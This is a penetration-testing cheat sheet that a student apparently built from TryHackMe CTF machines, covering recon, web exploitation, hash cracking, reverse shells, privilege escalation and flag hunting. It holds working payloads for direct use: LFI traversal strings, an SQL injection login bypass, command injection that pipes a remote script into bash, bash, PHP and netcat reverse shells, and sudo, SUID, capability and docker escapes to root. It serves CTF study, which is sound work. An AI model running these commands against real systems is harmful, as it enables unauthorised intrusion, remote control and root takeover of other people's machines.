note that this repo is updated when ever i solve a machine and find a unique idea
From my TryHackMe [Profile](https://tryhackme.com/p/Loaymorad) you can look at all machines i solved that i took them as a source for this CheckList.

##### About Me
my name is loay morad iam computer science student in 3rd year and iam also junior penetration tester

#### CheckList

##### 1 · Recon & Enumeration

###### What ports are open?

| Condition | Action |
|---|---|
| Always start with | `nmap -sC -sV -oA scan $IP` ·|
| FTP open (21) | `ftp $IP` → login: `anonymous` look for notes, keys, images ·|
| HTTP open (80/8080) | Check robots.txt, page source, headers, fuzz dirs tools: `gobuster`, `dirb`, `feroxbuster` ·|
| SMB / unusual ports | `nmap -p 445 --script smb-enum-shares $IP` ·|

###### Web app found what's running?

| Condition | Action |
|---|---|
| WordPress | Login → theme editor RCE (RCE via theme PHP) ·|
| Known CMS / version | Search ExploitDB for version-specific RCE ·|
| Custom / unknown app | Read source & comments; fuzz params tools: `wfuzz`, `ffuf` ·|
| Default / broken page | View page source creds or hidden paths may be commented ·|

---

##### 2 · Web Exploitation

###### File/path parameter in URL? → LFI

| Condition | Action |
|---|---|
| Basic traversal | `../../../etc/passwd` ·|
| Filter blocks `../` | `..//` or `....//` ·|
| Read PHP source | `php://filter/convert.base64-encode/resource=file.php` ·|
| LFI → RCE | Apache log poisoning inject PHP into User-Agent ·|
| No real file needed | PHP filter chain generator ·|

###### File upload available?

| Condition | Action |
|---|---|
| Extension blacklist | Try `.php2 .php3 .php5 .pht .phtml` ·|
| CMS advert/plugin | Inject PHP reverse shell into CMS feature ·|
| FTP → web root | `put shell.php` → `/files/ftp/shell.php` ·|

###### Login form present?

| Condition | Action |
|---|---|
| SQL injection | `' \|\| 1=1;-- -` ·|
| Source visible | Creds may be hardcoded or reversed: `echo "..." \| rev` ·|
| Auth bypass (CVE) | Remove password param from POST|
| Cookie / token | Decode (base64), swap cookie value ·|
| IDOR in param/API | `?user=guest` → `?user=admin` ·|

###### Command injection on page?

| Condition | Action |
|---|---|
| Filter bypass | `l\s -la` / `ba\sh` ·|
| Node.js eval | `require("child_process").exec(...)` ·|
| Generic | `curl <ip>/shell.sh \| bash` ·|

---

##### 3 · Credentials & Cracking

###### Got a hash?

| Condition | Action |
|---|---|
| MD5 | CrackStation or `hashcat -m 0` ·|
| SHA-512 / shadow | `hashcat -m 1800 hash.txt rockyou.txt` ·|
| ZIP / RSA key | `zip2john file.zip > h.txt && john h.txt` / `ssh2john id_rsa > h.txt && john h.txt` ·|
| Base64 encoded | `echo "..." \| base64 -d` ·|
| ROT13 / cipher | Use CyberChef try ROT13 first ·|

###### Have username, need password? → Brute force

| Condition | Action |
|---|---|
| SSH / FTP | `hydra -l <user> -P rockyou.txt ssh://$IP` ·|
| Web param | `ffuf -w wordlist.txt -u "http://target/?secret=FUZZ"` ·|

###### Suspicious image file? → Steganography

| Condition | Action |
|---|---|
| steghide | `steghide extract -sf file.jpg` (try blank password) ·|
| binwalk | `binwalk -e file.png` ·|
| strings | `strings binary_file` ·|
| Wrong magic number | Fix hex header: `hexeditor file.jpg` → `FF D8 FF` for JPEG ·|

---

##### 4 · Getting & Stabilising a Shell

###### Reverse shell options
This is a very good [reference](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) for reverse shell payloads

| Condition | Command |
|---|---|
| bash / sh | `bash -i >& /dev/tcp/<ip>/<port> 0>&1` |
| PHP | `php -r '$sock=fsockopen("ip",port);exec("/bin/bash -i <&3 >&3 2>&3");'` |
| mkfifo (universal) | `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc ip port >/tmp/f` |
| nc listener | `nc -lvnp 4444` |

###### Stabilise / upgrade shell

| Condition | Command |
|---|---|
| python pty | `python3 -c 'import pty;pty.spawn("/bin/bash")'` |
| script method | `/usr/bin/script -qc /bin/bash /dev/null` then Ctrl+Z → `stty raw -echo` → `fg` → `export TERM=xterm` |
| Port tunnelling | `ssh -N -R ATTACKIP:9001:127.0.0.1:9001 user@ATTACKIP` ·|

###### Transfer files between machines

**Victim → Attacker** (serve from victim, download on attacker)

1. On victim: `python3 -m http.server 8000`
2. On attacker: `wget http://<victim_ip>:8000/filename`

*Wonderland (teaParty binary for RE), Glitch (.firefox profile)*

**Attacker → Victim** (serve from attacker, curl/wget on victim)

1. On attacker: `python3 -m http.server 8000`
2. On victim: `curl http://<attacker_ip>:8000/shell.sh | bash`

*Chillhack, ContainMe*

**SCP (if SSH known)**

`scp user@$IP:/remote/path ./local/` · *Basic Pentesting (kay's id_rsa), Agent Sudo (image)*

---

##### 5 · Privilege Escalation

###### `sudo -l` → what can you run?

| Condition | Action |
|---|---|
| tar | `sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh` ·|
| vi / vim | `sudo vi -c ':!/bin/bash' /dev/null` ·|
| perl + writable script | Overwrite the script it calls ·|
| NOPASSWD: ALL | `sudo bash -i` instant root ·|
| !root quirk (CVE) | `sudo -u \#$((0xffffffff)) /bin/bash`|
| python3 runs a script (as other user) | Script uses relative import → drop fake module in same dir: `echo 'import os; os.system("/bin/bash")' > random.py` then `sudo -u rabbit /usr/bin/python3.6 /home/alice/script.py` ·|

###### SUID / custom binary?
[GTFOBins](https://gtfobins.github.io/gtfobins/perl/#capabilities) for some guidance in this world

| Condition | Action |
|---|---|
| Find them | `find / -user root -perm /4000 2>/dev/null` |
| nmap | `nmap --interactive` → `!sh` ·|
| python / python2.7 | `python2.7 -c 'import os; os.execl("/bin/sh","sh","-p")'` ·|
| xxd (SUID) | `echo 'ssh-key...' \| xxd \| /opt/xxd -r - /root/.ssh/authorized_keys` ·|
| named binary + version | Google binary name + version for public exploit ·|

**PATH hijacking workflow** binary calls a command without absolute path

1. Transfer binary to attacker: victim runs `python3 -m http.server 8000`, attacker runs `wget http://victim:8000/binary`
2. Find relative calls: `strings binary | awk 'length($0) > 10'` look for commands without a leading `/`
3. Create fake command in a writable dir: `echo -e '#!/bin/bash\n/bin/bash' > date && chmod +x date`
4. Prepend that dir to PATH: `export PATH=/home/rabbit:$PATH`
5. Run the SUID binary it picks up your fake command

*Wonderland (teaParty → date), Archangel (backup → cp)*

###### Linux Capabilities?

| Condition | Action |
|---|---|
| Find them | `getcap -r / 2>/dev/null` |
| perl cap_setuid | `perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh"'` ·|
| python cap_setuid | `python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'` |
| Any binary | Check GTFOBins "Capabilities" section https://gtfobins.github.io |

###### Cron jobs / writable scripts?

| Condition | Action |
|---|---|
| Find running jobs | `pspy64` or `cat /etc/crontab` |
| Writable called script | Append reverse shell, wait for cron ·|
| systemd timer | Edit writable .timer, daemon-reload, trigger manually ·|

###### Special group membership?

| Condition | Action |
|---|---|
| docker group | `docker run -v /etc/:/mnt -it alpine` ·|
| adm group | Read `/var/log/*` may contain passwords ·|

###### Lateral movement / other users?

| Condition | Action |
|---|---|
| MySQL on box | `grep -r "password" /var/www/ 2>/dev/null` ·|
| SSH key found | `chmod 600 id_rsa && ssh -i id_rsa user@$IP` ·|
| Firefox saved creds | Copy .firefox profile to attacker, open in Firefox Lockwise ·|
| grep logs / files | `grep -iR username /home /var/log 2>/dev/null` ·|
| password.txt in home | After lateral move, always `ls` the new user's home ·|

---

##### 6 · Finding Flags

###### Common flag locations & search commands

| Condition | Action |
|---|---|
| Search by name | `find / -name "*flag*" 2>/dev/null` / `find / -name "user.txt" -o -name "root.txt" 2>/dev/null` |
| Common paths | `/home/<user>/user.txt` · `/root/root.txt` · `/home/<user>/flag.txt` |
| Flags swapped | Some rooms flip locations try `cat /root/user.txt` directly ·|
| Hash in URL | MD5 of numbers 0–13 as URL path ·|
